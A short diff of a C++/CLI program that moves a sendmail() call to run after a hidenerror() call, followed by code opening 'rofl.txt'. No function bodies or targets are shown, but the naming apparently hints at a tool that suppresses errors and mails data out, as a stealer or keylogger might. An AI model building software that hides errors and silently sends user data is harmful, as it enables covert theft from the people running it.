@@ -149,9 +149,9 @@ int main(array<System::String ^> ^args)
 		return 0;
 	}
 
-	sendmail();
-
 	hidenerror();
+	
+	sendmail();
 
 	std::ofstream txt("rofl.txt");
 
